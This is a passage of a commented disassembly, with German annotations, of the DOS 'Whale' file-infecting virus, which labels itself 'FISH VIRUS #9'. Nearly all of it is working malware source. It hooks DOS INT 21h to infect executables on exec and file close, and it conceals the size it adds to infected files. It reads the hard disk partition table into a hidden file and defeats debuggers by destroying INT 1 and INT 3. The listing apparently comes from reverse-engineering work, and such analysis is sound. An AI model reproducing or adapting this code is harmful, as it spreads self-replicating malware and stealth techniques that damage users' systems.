                POP     DS
                CLD
                MOV     CX,0005h ; Tauscht 5 Byte im DOS aus gegen
                                 ; einen FAR-JMP zur Wal-Routine !
J02C22:         LODSB
                XCHG    AL,ES:[DI]
                MOV     [SI-01h],AL
                INC     DI
                LOOP    J02C22
                MCODE   13
                RETN
;=====================================================( trash ?!? )===
J02C31:         XOR     AX,CX
                INC     BX
                OR      ES:[BX],AX
                LOOP    J02C31
                MOV     BX,CX
                DB      0E8h                    ;... trash !
;=====================================================================
;============================================( pusht alle register)===
;=====================================================================
PushALL:        MDECODE 14
                POP     CS:[D24EA]
                PUSHF
                PUSH    AX
                PUSH    BX
                PUSH    CX
                PUSH    DX
                PUSH    SI
                PUSH    DI
                PUSH    DS
                PUSH    ES
                MCODE   14
                JMP     CS:[D24EA]
;=====================================================================
;========================================( setzt INT 01 auf Tracer)===
;=====================================================================
SetInt_01:      MDECODE 15
                MOV     AL,01h
                PUSH    CS
                POP     DS
                MOV     DX,Offset Int_01_entry-Offset VirStart
                CALL    SetInt_AL                       ; SET INT 01
                MCODE   15
                RETN
;=====================================================================
;===========================( setzt INT ( nummer in AL) auf DS:DX )===
;=====================================================================
SetInt_AL:      MDECODE 16
                PUSH    ES
                PUSH    BX
                XOR     BX,BX
                MOV     ES,BX
                MOV     BL,AL
                SHL     BX,1
                SHL     BX,1
                MOV     ES:[BX    ],DX
                MOV     ES:[BX+02h],DS
                POP     BX
                POP     ES
J02C88  EQU     $+2
                MCODE   16
                RETN
;=====================================================================
;==============================(sichert Register auf eigenem Stack)===
;=====================================================================
SaveRegisters:  MDECODE 17
                MOV     CS:[D2557],SP
                MOV     CS:[D2559],SS
                PUSH    CS
                POP     SS
                MOV     SP,CS:[Vir_SP]
                CALL    CS:PUSHALL
                MOV     SS,CS:[D2559]
                MOV     CS:[Vir_SP],SP
                MOV     SP,CS:[D2557]
                MCODE   17
                RETN
;=====================================================================
;==============================( holt INT ( nummer AL ) nach ES:BX)===
;=====================================================================
GetInt_AL:      MDECODE 18
                PUSH    DS
                PUSH    SI
                XOR     SI,SI
                MOV     DS,SI
                XOR     AH,AH
                MOV     SI,AX
                SHL     SI,1
                SHL     SI,1
                MOV     BX,[SI]
                MOV     ES,[SI+02h]
                POP     SI
                POP     DS
                MCODE   18
                RETN
;=====================================================================
;=========================( Zweiter Teil der Trace-Routine J02A63 )===
;=====================================================================
J02CD8:         POP     AX      ; AX = 2A7Dh
J02CDA          EQU     $+1     ; = INC  SI
                                ;   OR   [BX],AL
                                ;   XCHG BX,[BP+08h] , usw.

                ADD     WORD Ptr [BP+08h],+07h  ; Change IP after IRET  ??
                XCHG    BX,[BP+08h]
                MOV     DX,BX
                XCHG    BX,[BP+02h]

                SUB     SI,@0478           ; = ADD SI,@FB88
                MOV     BX,SI              ;
                ADD     BX,SwapCode_6      ; 04EFh

                POP     BP                 ; Original BP aus Trace-Routine
                                           ; J02A63
                PUSH    CS:[SI+SwapCode_8] ; dort steht "E9CF"
                POP     AX                 ; AX = "E9CF"
                XOR     AX,020Ch           ; AX = "EBC3"
                MOV     CS:[BX],AL ; PATCHT INT 3 WEG : INT 3 -> RET
                                   ; Spielt aber gefÑhrlich mit der Queue,
                                   ; kein Wunder, dass das Teil auf ATs
                                   ; nicht funktioniert...
                ADD     AX,020Ch   ; AX = EDCF
;*********************************************************************
CALL    EIN_RETURN      ;************ EingefÅgt **********************
;*********************************************************************
J02CFF:         INT     3          ; ->  RET
                                   ; ABER RET [SP+2] !!!!!
                                   ; das heisst : Ende der Trace-Routine
                                   ; ist hier.
;=====================================================================
J02D00:         JMP     J02D60
                DB      0EBh
;=====================================================================
;====================( Handler fÅr Findfirst/Findnext FCB / AH=11 )===
;=====================================================================
J02D04:         MDECODE 19
                CALL    PopALL
                CALL    CS:[@INT21]      ; CALL INT 21H
                OR      AL,AL
                MCODE   19
                JZ      J02D1C
                JMP     IRET_Int21h
                ;------------------
J02D1C:         MDECODE 20
                CALL    PushALL
                CALL    GetDTA
                MOV     AL,00h
                CMP     BYTE Ptr DS:[BX],0FFh   ; Extended FCB ?
                JNZ     J02D34

                MOV     AL,[BX+06h]             ; dann Attribut -> AL
                ADD     BX,+07h                 ; und zum Normalen FCB
J02D34:         AND     CS:[D24F0],AL           ;
                TEST    BYTE Ptr DS:[BX+18h],80h; reserved..Shit
                MCODE   20
                JNZ     J02D46
                JMP     J02EA3                  ; fertig

J02D46:         SUB     BYTE Ptr DS:[BX+18h],80h
                CMP     WORD Ptr DS:[BX+1Dh],Code_len
                JNB     J02D54
                JMP     J02EA3                  ; fertig

J02D54:         SUB     WORD Ptr DS:[BX+1Dh],Code_len
                SBB     WORD Ptr DS:[BX+1Fh],+00h
                JMP     J02EA3                  ; fertig
;=====================================================================
J02D60:         LOOP    J02D66          ; wenn CX <> 0 dann J02D66
                JMP     J03251          ; sonst J03251 -> J034D4
;---------------------------------------------------------------------
                DB      0ebh            ; TRASH !
;---------------------------------------------------------------------
J02D66:         INC     BX
                JMP     J02FA2
;=====================================================================
;===============================================( Suche nach Fish )===
;=====================================================================
Suche_Fish:     MDECODE 21
                CALL    PushALL
                IN      AL,40h    ; Hole Zufallszahl
                CMP     AL,40h    ; ist sie < 40h, dann Partitionstabelle
                MCODE   21        ; lesen und FISH.TBL erzeugen
                JB      J02D7F
                JMP     J02E9F    ; sonst nicht.
;=====================================================================
;============( LESEN der Partitionstabelle bei jeder 4. Infektion )===
;=====================================================================
J02D7F:         MDECODE 22
                MOV     AL,01h          ; EINEN SEKTOR
                MOV     AH,02h          ; LESEN
                PUSH    CS
                POP     BX
                SUB     BH,10h          ;
                MOV     ES,BX           ; NACH ES:0000h
                MOV     BX,0000h        ;
                MOV     CH,00h          ; SPUR 0
                MOV     CL,01h          ; SEKTOR 1 ( Partitionstabelle )
                MOV     DH,00h          ; 1. HEAD
                MOV     DL,80h          ; 1. FESTPLATTE
                PUSHF
                CALL    DWORD PTR CS:[Trace_Adres]     ; INT 13h !
                MCODE   22
                JNB     J02DA9
                JMP     J02E9F
;=====================================================================
;=========================( erzeugen der FISH.TBL als HIDDEN-File )===
;=====================================================================
J02DA9:         MDECODE 23
                PUSH    CS
                POP     DS
                MOV     AH,5Bh                  ; CREATE NEW FILE
                MOV     CX,0002h                ; ATTRIBUT "SYSTEM"
                MOV     DX,OFFSET D2DDB-Offset VirStart
                                                ; NAME IN DS:05CBH/CS:D2DDB
                CALL    CS:[@INT21]
                JNB     J02DC2
                JMP     J02E9B
J02DC2:         PUSH    ES
                POP     DS
                MOV     BX,AX
                MOV     AH,40h                  ; schreibe
                MOV     CX,0200h                ; 200h Byte
                MOV     DX,0000h                ; ab ES:0000
                                                ; Partitionstabelle
                CALL    CS:[@INT21]
                JB      J02DD8
                JMP     J02E85
J02DD8:         JMP     J02E9B
        ;=============================================================
D2DDB   DB      "C:\FISH-#9.TBL",0
D2DEA   DB      "FISH VIRUS #9  "
        DB      "A Whale is no Fish! "
        DB      "Mind her Mutant Fish and the hidden Fish Eggs for "
        DB      "they are damaging. "
        DB      "The sixth Fish mutates only if Whale is in her Cave"
        ;=============================================================
J02E85:         PUSH    CS
                POP     DS
                MOV     AH,40h
                MOV     CX,009Bh
                MOV     DX,OFFSET D2DEA-Offset VirStart
                CALL    DS:[@INT21]
                JB      J02E9B
                MOV     AH,3Eh
                CALL    DS:[@INT21]
J02E9B:         MCODE   23
J02E9F:         CALL    PopALL
                RETN
;---------------------------------------------------------------------
J02EA3:         CALL    PopALL
                JMP     IRET_Int21h
;=====================================================================
;================================( Handler fÅr OPEN FCB , AH = 0F )===
;=====================================================================
J02EA9:         MDECODE 24
                CALL    PopALL
                CALL    CS:[@INT21]
                CALL    PushALL
                OR      AL,AL
                MCODE   24
;==============================
                JNZ     J02EA3          ; fertig

                MOV     BX,DX
                TEST    BYTE Ptr DS:[BX+17h],80h
                JZ      J02EA3          ; fertig
                SUB     BYTE Ptr DS:[BX+17h],80h
                SUB     WORD Ptr DS:[BX+10h],Code_len   ; unerkannt
                                                        ; bleiben
                SBB     BYTE Ptr DS:[BX+12h],00h
                JMP     J02EA3          ; fertig
;=====================================================================
;=============================( Handler fÅr Read Random Block FCB )===
;=====================================================================
J02ED8:         JCXZ    J02F08
;=====================================================================
;===================================( Handler fÅr Read Random FCB )===
;=====================================================================
J02EDA:         MDECODE 25
                MOV     BX,DX
                MOV     SI,[BX+21h]
                OR      SI,[BX+23h]
                MCODE   25
                JNZ     J02F08
                JMP     J02F03
                DB      0e8h
;=====================================================================
;================================( Handler fÅr Read Seq. FCB.AH=14)===
;=====================================================================
J02EF0:         MDECODE 26
                MOV     BX,DX       ; DS:DX ist Adresse des geîffneten FCB
                MOV     AX,[BX+0Ch] ;
J02EFA:         OR      AL,[BX+20h]
                MCODE   26
                JNZ     J02F08

J02F03:         CALL    J0397A          ; SAVEREGS,ES=DS, DI=DX+0Dh
                JNB     J02F55          ; Datei ist ausfÅhrbar
J02F08:         JMP     J02B8B          ; sonst : CALL LOW-INT-21
;=====================================================================
J02F0B:         JMP     J03251          ; -> J034D4
;-----------------------------------------------------------(trash)---
                MOV     [BP+02h],DX
                MOV     [BP+04h],CX
                DB      0EBh
;---------------------------------------------------------------------
;------------------------( erste Proc nach Initialisierung von SI )---
;---------------------------------------------------------------------
J02F15:         IN      AL,21h          ; SI = 2810h / VirStart
                OR      AL,02h
                OUT     21h,AL
                XOR     BX,BX
                PUSH    BX              ; PUSH 0 auf Stack
                MOV     BP,0020h
                POP     DS              ; DS = 0000
                MOV     CX,BP           ; CX = 0020
                CALL    $+3             ; GET IP
                POP     BX              ; BX = 2F27
                PUSH    BX
                POP     DX              ; DX = 2F27
                PUSH    CS
                POP     AX              ; AX = CS
                ADD     AX,0010h        ; AX = CS:0100
                ADD     BX,AX
                XOR     DX,BX

J02F33:         SUB     SI,@FB88        ; ADD SI,478h; SI = 2C88
                                        ; AX = 5BC0
                                        ; BX = 8AE7
                                        ; CX = 0020
                                        ; DX = A5C0
                                        ; DS = 0000
                CALL    J02AD2          ;
                                        ; 2F3A auf Stack als ret-adr
                ;------>(J02EC8)----[keine RÅckkehr vom CALL ! ]------
                ;-----------------------------------------------------
                DB      0E9H
;=====================================================================
;====================================================( no entry...)===
;=====================================================================
        MOV     BYTE PTR [DI],0EBH
        JMP     J035E3          ; Erzeugt eine 7 Byte-Tabelle und checkt
                                ; Verfallsdatum
;=====================================================================
;====================================================( no entry...)===
;=====================================================================
J02F41: XCHG    DX,BX
J02F43: MOV     WORD PTR DS:[0004h],BX
        OR      CX,CX
        JZ      J02F0B
        DEC     CX
        JMP     J02FA2
;--------------------------------------------------------------------
        DB      1Ch,00,53h,57h,0E8h
;=====================================================================
;============================( zum Handler fÅr Read Seq. FCB.AH=14)===
;=====================================================================
J02F55:         MDECODE 27
                CALL    CS:[@INT21]         ; CALL INT 21h
                MOV     [BP-08],CX
                MOV     [BP-04],AX
                PUSH    DS
                PUSH    DX
                CALL    GetDTA
                CMP     Word Ptr DS:[BX+14],1
                MCODE   27
                JZ      J02FF6
;==========================================( check auf infektion )===
J02F7A:         MDECODE 28
                MOV     AX,[BX    ]
                ADD     AX,[BX+02h]
                PUSH    BX
                MOV     BX,[BX+04h]
                XOR     BX,5348h        ; 'SH'  --> 'FISH' !
                XOR     BX,4649h        ; 'FI'
                ADD     AX,BX
                POP     BX
                MCODE   28
                JZ      J02FF6
                ADD     SP,+04h
                JMP     J02EA3          ; fertig
;=================================================================
                DB      12h
;=================================================================
J02FA0:         JMP     J02F33
;=================================================================
J02FA2:
                MOV     Word PTR DS:[0004h],DX
                MOV     BX,Word Ptr DS:[000Ch]
                IN      AL,01h                  ;?????!??????!????
                OR      CX,CX
                JZ      J02FC0
                CMP     CL,BL
                JB      J02FC0
                XCHG    BX,DX
                MOV     Word PTR DS:[0004h],DX
                XOR     DX,AX
                LOOP    J02FA0          ; JMP J02F33, if CX <> 0
                                        ; ist identisch mit
                                        ; "JMP J02FC0"....
                JZ      J02FCB          ; -> J03251 -> J034D4


J02FC0:         ADD     SI,@0478
                CALL    J02AD2          ; ->keine RÅckkehr vom CALL !<-
;-------------------------------------------------------------------
                DB      0E9H,0A8h,09h,0EAh
;-------------------------------------------------------------------
J02FCB:         JMP     J03251          ; -> 34d4
;=====================( no entry )==( muss (!) ausgefÅhrt werden )===
J02FCE:         MOV     BYTE PTR CS:[SI+SwapCode_5],0E8h
                                        ; Adresse J03259
                OR      CX,CX           ; Ist am anfang immer 20h
                                        ; also wird 32 Mal diese Schleife
                                        ; ausgefÅhrt und versucht, den
                                        ; INT 1 zu setzen.....
                JZ      J02FCB          ; Zur Arbeit !
                ;---------------------------------------------------
                ; INT 1 und INT 3 zerstîren.
                ;---------------------------------------------------
                MOV     Word Ptr DS:[000Ch],BX
                XOR     DX,BX
                MOV     Word Ptr DS:[0004h],DX
                XOR     AX,DX
                MOV     Word Ptr DS:[000Ch],AX
                JMP     J02D00                  ; schlechter Pfad !
;========================================================( trash )===
J02FEA:         DB      081h,0c6h,090h,034h,0b9h,01ch
                DB      000h,0f4h,0a4h,033h,0c9h,0e8h
;=====================================================================
;============================( zum Handler fÅr Read Seq. FCB.AH=14)===
;=====================================================================
J02FF6:         MDECODE 29
                POP     DX
                POP     DS
                MOV     SI,DX

                PUSH    CS
                POP     ES
                MOV     CX,0025h
                MOV     DI,Offset @FCB  ; Kopiere FCB
                REPZ    MOVSB
   
                MOV     DI,Offset @FCB
                PUSH    CS
                POP     DS
                MOV     DX,[DI+12h]     ; HOLE FILESIZE nach DX:AX
                MOV     AX,[DI+10h]
                ADD     AX,Code_Len+0FH ; ADD filesize, 240fh
                ADC     DX,+00h
                AND     AX,0FFF0h       ; Filesize auf (mod 16) normieren
                MOV     [DI+12h],DX
J03020:         MOV     [DI+10h],AX     ; und zurueck
                SUB     AX,Code_Len-4   ; 23fc abziehen
                SBB     DX,+00h
                MOV     [DI+23h],DX     ; und nach RandomRec kopieren ?!?
                MOV     [DI+21h],AX     ; Dadurch wird das FILE in
                                        ; einem Record gelesen ( aber nur,
                                        ; wenn's kleiner als 1 Segment ist)

                MOV     CX,001Ch        ; Lese 1Ch byte (EXE-Header)
                MOV     WORD Ptr DS:[DI+0Eh],0001h

                MOV     AH,27h          ; READ RANDOM BLOCK FCB
                MOV     DX,DI
                CALL    CS:[@INT21]
                MCODE   29
                JMP     J02EA3          ; fertig
;=====================================================================
;================================================( AUS DEM HIER : )===
;=====================================================================
J03047: DB      03BH,0DEH       ; CMP     BX,SI
        DB      074H,0D5H       ; JZ      J03020
        RETN
;=====================================================================
;===============================================( Wird DAS HIER : )===
;=====================================================================
        ;J03047:XOR     WORD PTR CS:[SI],BX
        ;       NOP
        ;       RET
;=====================================================================
;============================================(  DER CODE-PATCHER  )===
;============================================( SI kommt mit 210Ah )===
;=====================================================================
PATCH:          PUSH    BX

                ADD     SI,OFFSET J0492F-OFFSET J0491A
                MOV     BX,157Dh        ; SI = 211F / 492F
                CALL    J03047

                ADD     SI,+02h         ; SI = 2121 / 4931
                MOV     BX,758Bh
                CALL    J03047

                ADD     SI,+02h         ; SI = 2123 / 4933
                MOV     BX,0081h
                CALL    J03047

                ADD     SI,+08h         ; SI = 212B / 493B
                MOV     BX,0A08h
                CALL    J03047

                ADD     SI,+02h         ; SI = 212D / 493D
                MOV     BX,302Fh
                CALL    J03047

                ADD     SI,+02h         ; SI = 212f / 493F
                MOV     BX,02A5h
                CALL    J03047
                ;----------------------( DECODE ist jetzt 'anders')---

                ADD     SI,OFFSET J0499D-OFFSET J04941+2
                MOV     BX,157Dh        ; SI = 218D / 499D
                CALL    J03047

                ADD     SI,+05h         ; SI = 2192 / 49A2
                MOV     BX,0A09Fh
                CALL    J03047

                ADD     SI,+0Ah         ; SI = 219C / 49AC
                MOV     BX,00A7h
                CALL    J03047

                ADD     SI,+0Ch         ; SI = 21A8 / 49B8
                MOV     BX,872Dh
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AA / 49BA
                MOV     BX,7829h
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AC / 49BC
                MOV     BX,4229h
                CALL    J03047

                ADD     SI,+02h         ; SI = 21AE / 49BE
                MOV     BX,1AC0h
                CALL    J03047
                ;---------------( CODEIT ist jetzt auch 'anders' )---

                ADD     SI,OFFSET J04A2A-OFFSET J049C0 + 2
                                        ; SI = 221A / 4A2A
                MOV     BX,1114h
                CALL    J03047

                ADD     SI,OFFSET J04A39 - OFFSET J04A2A
                                        ; SI = 2229 / 4A39
                MOV     BX,0000h        ; ? NOP ?
                CALL    J03047

                ADD     SI,OFFSET J04A44 - OFFSET J04A39
                                        ; SI = 2234 / 4A44
                MOV     BX,02E3h
                CALL    J03047

                POP     BX
                RETN
;=====================================================================
;=================================( Handler fÅr GET FILESIZE /FCB )===
;=====================================================================
J030DF:         MDECODE 30
                PUSH    CS
                POP     ES
                MOV     DI,Offset @FCB
                MOV     CX,0025h                     ; Kopiere FCB
                MOV     SI,DX
                REPZ    MOVSB
   
                PUSH    DS
                PUSH    DX
                PUSH    CS
                POP     DS

                MOV     AH,0Fh                       ; OPEN FCB
                MOV     DX,Offset @FCB               ; FCB steht an DS:DX
                CALL    CS:[@INT21]
                MOV     AH,10h                       ; CLOSE FCB !
                CALL    CS:[@INT21]
                TEST    BYTE Ptr DS:[@FCB+17H],80h
                POP     SI
                POP     DS
                MCODE   30

                JZ      J03182

                LES     BX,DWord ptr CS:[@FCB+010h] ; File-Size

J03117:         MDECODE 31
                MOV     AX,ES
                SUB     BX,Code_len
                SBB     AX,0000h
                XOR     DX,DX
                MOV     CX,WORD PTR CS:[@FCB+0eh]  ; Rec-Size
                DEC     CX
                ADD     BX,CX
                ADC     AX,0000h
                INC     CX
                DIV     CX
                MOV     [SI+23h],AX
                XCHG    AX,DX         ;
                XCHG    AX,BX
                DIV     CX
                MOV     [SI+21h],AX
                MCODE   31
                JMP     J02EA3          ; fertig
;=====================================================================
;=======================================( setzt INT 02 auf "IRET" )===
;=====================================================================
StopINT_02:     MDECODE 32
                CALL    PushALL
                IN      AL,21h
                OR      AL,02h                  ; setze Bit 2
                OUT     21h,AL

                MOV     AL,02h
                CALL    GetInt_AL               ; GET INT 02
                                                ; ergebnis in ES:BX
                MOV     AX,CS                   ; AX = CS
                MOV     CX,ES
                CMP     AX,CX
                JZ      J03179
                MOV     WORD PTR CS:[@INT02+2],ES
                MOV     WORD PTR CS:[@INT02  ],BX

                PUSH    CS
                POP     DS
                CALL    J03170
J03170:         POP     DX                      ; GET IP
                ADD     DX,OFFSET INT_02-OFFSET J03170

                MOV     AL,02h
                CALL    SetInt_AL               ; SET INT 02 auf IRET

J03179:         CALL    PopALL
                MCODE   32
                RETN
;=====================================================================
INT_02:         IRET    ; KOPROZESSORFEHLER + MEMORY PARITY-FEHLER
;=====================================================================
J03182:         JMP     J02B8B          ; CALL LOW_INT_21
                DB      0E8h
;=====================================================================
;=======================================( SET INT 02 zum Original )===
;=====================================================================
Re_SET_Int_02:  MDECODE 33
                CALL    PushALL

                IN      AL,21h
                AND     AL,0FDh             ; lîsche Bit 2
                OUT     21h,AL

                LDS     DX,CS:[@INT02]     ; OLD INT 02
                MOV     AL,02h
                CALL    SetInt_AL          ; SET INT 02
                CALL    PopALL
                MCODE   33
                RETN
;=====================================================================
;================================( Handler fÅr Open File / Handle )===
;=====================================================================
J031A6:         CALL    GET_Current_PSP
                CALL    J039C3          ; ist die Datei ausfÅhrbar ?
                JB      J031F1          ; nein....
                CMP     BYTE PTR CS:[D24A2],00h ; hab ich schon infiziert
                JZ      J031F1
                CALL    J043B1          ; Vorarbeiten
                CMP     BX,0ffffh       ; Fehler bei Vorarbeiten ??
                JZ      J031F1          ; oder garkeine DATEI ??
;===========================================()==========================
                MDECODE 34
                DEC     BYTE PTR CS:[D24A2]
                PUSH    CS
                POP     ES

                MOV     CX,0014h
                MOV     DI,Offset D2452 ; ja ? wenn ich's wÅsst...
                XOR     AX,AX
                REPNZ   SCASW

                MOV     AX,CS:[@PSP]
                MOV     ES:[DI-02h],AX
                MOV     ES:[DI+26h],BX
                MOV     [BP-04h],BX
                MCODE   34

J031E7:         AND     BYTE PTR CS:[D24B3],0FEh        ; CF lîschen
                JMP     J02EA3          ; fertig

                DB      0E8h

J031F1:         JMP     J02B8B  ; CALL LOW_INT_21
;=====================================================================
;===============================( Handler fÅr CLOSE FILE / Handle )===
;=====================================================================
J031F4:         MDECODE 35
                PUSH    CS
                POP     ES
                CALL    GET_Current_PSP
                MOV     CX,0014h
                MOV     AX,CS:[@PSP]
                MOV     DI,Offset D2452
                MCODE   35

J0320C:         REPNZ   SCASW
J0320E:         JNZ     J03227
                CMP     BX,ES:[DI+26h]
                JNZ     J0320C
                MOV     WORD PTR ES:[DI-02h],0000h
                CALL    J03642                  ; infizieren !
                INC     BYTE PTR CS:[D24A2]
                JMP     J031E7
        ;================================
                DB      0BBh
        ;================================
J03227:         JMP     J02B8B          ; Call LOW-INT-21
        ;================================
                DB      3DH
        ;================================
;=====================================================================
;=============================================( Hole aktuelle DTA )===
;=====================================================================
GetDTA:         MDECODE 36
                MOV     AH,2FH          ; GET DTA
                PUSH    ES
                CALL    CS:[@INT21]
                PUSH    ES
                POP     DS
                POP     ES
                MCODE   36
                RETN
;---------------------------------------------------------------------
J03240:         DB      0E9H,012H,003H  ; JMP     J03555  == NIRWANA !
;=====================================================================
;=====================================( versteckter DECODE-Aufruf )===
;=====================================================================
Decode:         JMP     J0491B          ; CMP     AX,16D5H
;-----------------------------------------------------------(trash)---
        JZ      J03240
	SUB	AX,12EFh
	DEC	SI 
	INC	BH
	JMP	J02FEA
;=====================================================================
;=====(-----------------------------------------------------------)===
;=====(                   Affengeiler Code                        )===
;=====(-----------------------------------------------------------)===
;=====( SP sichern in BP                                          )===
;=====( "C353" auf den Stack, wobei SS=CS & C353 = "PUSH BX, RET" )===
;=====( Dann ein CALL dessen RET-Adresse vom Stack geholt wird.   )===
;=====( DafÅr wird DX alias BP auf den Stack gelegt. Kuckuck !    )===
;=====( Schliesslich wird nach SS:SP-2, also "PUSH BX, RET",      )===
;=====( gesprungen, also ein "RET" zur Adresse J034D4 ausgefÅhrt  )===
;=====(-----------------------------------------------------------)===
;=====( Kein Wunder, da· der Wal nach Fischen sucht ;-)))         )===
;=====================================================================
J03251:         MOV     DX,BP                   ; DX = BP
                MOV     BP,SP
                MOV     BX,0C353H
                PUSH    BX
J03259:         CALL    J0341A                  ; ursprÅnglich "INT 3"
J0325C          DB      0BBH
;----------------------------------------------------------( Info )---
;       J0341A: POP     BX                              ; BX = 325C
;               ADD     BX,OFFSET J034D4-Offset J0325C
;               PUSH    DX                      ;
;               SUB     BP,+02h                 ; BP = SP-2
;               DB      36H                     ; hat noch gefehlt :-)
;               JMP     BP                      ; = JMP  DX / JMP 34D4
;--------------------------( => )------
;     SS:SP-2   PUSH   BX       ; = 53h
;     SS:SP-1   RET             ; = C3h
;=====================================================================
;==============================================( Handler fÅr EXEC )===
;=====================================================================
J0325D:         OR      AL,AL   ; Ist AL = 0 ( = Load + execute ) ?
                JZ      J03264  ; JA !!
                JMP     J034FC
;=====================================================================
;================================================( EXEC AX = 4B00 )===
;=====================================================================
J03264:         MDECODE 37
                PUSH    DS
                PUSH    DX
                MOV     Word ptr CS:[D2424+2],ES        ; Adress of EPB
                MOV     Word ptr CS:[D2424  ],BX
                LDS     SI,DWord ptr CS:[D2424]

                MOV     CX,000Eh                    ; kopiere epb in ds
                MOV     DI,Offset EPB
                PUSH    CS
                POP     ES
                REPZ    MOVSB

                POP     SI
                POP     DS
                MOV     CX,0050h                ; kopiere kommandozeile
                MOV     DI,Offset Cmd_Line
                REPZ    MOVSB

                MOV     BX,0FFFFh               ; wird wieder zerstîrt
                CALL    PopALL
                POP     BP                      ; Original-BP
                POP     CS:[D24E6]              ; CALLERs IP
                POP     CS:[D24E8]              ; CALLERS CS
                POP     CS:[D24B3]              ; CALLERS Flags
                PUSH    CS

                MOV     AX,4B01h                ; Load, but do not execute
                POP     ES                      ; Segment EPB
                PUSHF
                MOV     BX,Offset EPB           ; Offset EPB
                CALL    CS:[Low_INT_21H]

                MCODE   37

                JNB     J032DA                  ; JMP if kein Fehler

                OR      WORD PTR CS:[D24B3],+01h; sonst CF setzen
                PUSH    CS:[D24B3]              ; Flags
                PUSH    CS:[D24E8]              ; CS
                PUSH    CS:[D24E6]              ; IP
                PUSH    BP
                LES     BX,DWord ptr CS:[D2424] ; Alten EPB zurÅck
                MOV     BP,SP                   ; Alten SP
                JMP     IRET_Int21h             ; und fertig
;======================================================
                DB      89h,04h
;=======================================( kein Fehler aufgetreten )===
J032DA:         MDECODE 38
                CALL    GET_Current_PSP
                PUSH    CS
                POP     ES
                MOV     CX,0014h
                MOV     DI,Offset D2452
J032EA:         MOV     AX,CS:[@PSP]
                REPNZ   SCASW
                JNZ     J032FF
                MOV     WORD PTR ES:[DI-02h],0000h
                INC     BYTE PTR CS:[D24A2]
                JMP     J032EA
;====================================================================
J032FF:         MCODE   38
                LDS     SI,DWORD PTR CS:[D2503] ; Ist IP-Init = 1 ( WAL ! )
                CMP     SI,+01h
                JNZ     J0334D                  ; nein. Dann infizieren
                                                ; sonst wal ausblenden
                MDECODE 39
                MOV     DX,Word Ptr DS:[001Ah]
                ADD     DX,+10h

                MOV     AH,51h
                CALL    CS:[@INT21]

                ADD     DX,BX
                MOV     Word Ptr CS:[D2505],DX
                PUSH    Word Ptr DS:[0018h]
                POP     Word Ptr CS:[D2503]

                ADD     BX,Word Ptr DS:[0012h]
                ADD     BX,+10h
                MOV     Word Ptr CS:[D2501],BX

                PUSH    Word Ptr DS:[0014h]
                POP     Word Ptr CS:[D24FF]

                MCODE   39
                JMP     J0345F
;---------------------------------------------------------------------
                DB      09h
;---------------------------------------------------------------------
J0334D:         JMP     J03428          ; jmp zut Infect-routine
;=====================================================================
;===================================================( Selbst-Test )===
;=====================================================================
J03350:         MDECODE 40
                CALL    PushALL
                JMP     J03362

J0335B:         XOR     AL,CS:[BX]
                INC     BX
                LOOP    J0335B
                RETN
;-----------------------------------( netterweise werden hier die )---
;-----------------------------------( 'echten' Labels publik !    )---
J03362:         XOR     AL,AL
                MOV     BX,0021h        ; 2831..2852 ; ENTRY...2852
                MOV     CX,007Ah
                CALL    J0335B
                MOV     BX,0173h        ; 2983..298d ; init SI
                MOV     CX,000Ah
                CALL    J0335B
                MOV     BX,0253h        ; 2a63..2a7f ; trace...
                MOV     CX,001Ch
                CALL    J0335B
                MOV     BX,0550h        ; 2d60..2d6a ; ?????????????
                MOV     CX,000Ah
                CALL    J0335B
                MOV     BX,0705h        ; 2f15..2f55
                MOV     CX,0040h
                CALL    J0335B
                MOV     BX,0790h        ; 2fa0..2ff6
                MOV     CX,0056h
                CALL    J0335B
                MOV     BX,0A30h        ; 3240..3264
                MOV     CX,0024h
                CALL    J0335B
                MOV     BX,0C0Ah        ; 341a..3428
                MOV     CX,000Eh
                CALL    J0335B
                MOV     BX,0CC4h        ; 34d4..3510
                MOV     CX,003Ch
                CALL    J0335B
                MOV     BX,105Ah        ; 386a..3897
                MOV     CX,002Dh
                CALL    J0335B
                MOV     BX,1106h        ; 3916..393f
                MOV     CX,0029h
                CALL    J0335B
                MOV     BX,210Ah        ; 491a..4981
                MOV     CX,0067h
                CALL    J0335B
                MOV     BX,2173h        ; 4983..4a56
                MOV     CX,00D8h
                CALL    J0335B
                MOV     BX,236Ch        ; 4b7c..4bb5
                MOV     CX,0039h
                CALL    J0335B
                MOV     BX,1D7Dh        ; 458d..45b2
                MOV     CX,0025h
                CALL    J0335B
                MOV     BX,1C7Ch        ; 448c..44ce
                MOV     CX,0042h
                CALL    J0335B
                CMP     AL,0E0h                          ; sic !!
                JZ      J03412
        ;-----------------------------------------------------
                MOV     WORD PTR CS:[D2598],0F4F4h     ; = HLT
                MOV     BX,OFFSET D2598
                PUSHF
                PUSH    CS
                PUSH    BX
                XOR     AX,AX
                MOV     DS,AX
                MOV     WORD PTR DS:[0006h],0FFFFh     ; SEGMENT Int 01
                CALL    Debugger_Check                 ; STOP
        ;-----------------------------------------------------
J03412:         CALL    PopALL
                MCODE   40
J03419:         RETN
;====================================================( JMP J034D4 )===
J0341A:         POP     BX                              ; BX = 325C
                ADD     BX,OFFSET J034D4-Offset J0325C  ; BX = 34D4
                PUSH    DX                              ;
                SUB     BP,+02h                         ; BP = SP
                ;****************************************************
                DB      36H             ; Seg-Prefix hat noch gefehlt
                ;****************************************************
                JMP     BP              ; -> JMP  DX -> JMP BX
;---------------------------------------------------------------------
                DB      0E9h,0DBh,000
;-------------------------------( Nochmal Kontrolle, ob infiziert )---
J03428:         MDECODE 41
                MOV     AX,[SI]
                ADD     AX,[SI+02h]
                PUSH    BX
                MOV     BX,[SI+04h]

                XOR     BX,5348h   ; 'SH'
                XOR     BX,4649h   ; 'FI'

                ADD     AX,BX
                POP     BX
                MCODE   41
                JZ      J034AF                  ; ist schon infiziert
                PUSH    CS
                POP     DS
                MOV     DX,Offset Cmd_Line
                CALL    J039C3          ; ist die Datei ausfÅhrbar ?
                CALL    J043B1          ; Vorarbeiten
                INC     BYTE PTR CS:[D24EF]
                CALL    J03642          ; infizieren
                DEC     BYTE PTR CS:[D24EF]
;=====================================================================
;===================================( Datei im RAM wird gestartet )===
;=====================================================================
J0345F:         MDECODE 42

                MOV     AH,51h                  ; GET current PSP
                CALL    CS:[@INT21]

                CALL    SaveRegisters
                CALL    Patch_IBMDOS
                CALL    GetRegsFromVirstack
                MOV     DS,BX
                MOV     ES,BX
                PUSH    WORD PTR CS:[D24B3]     ; CALLERs FLAGS
                PUSH    WORD PTR CS:[D24E8]     ; Caller-CS
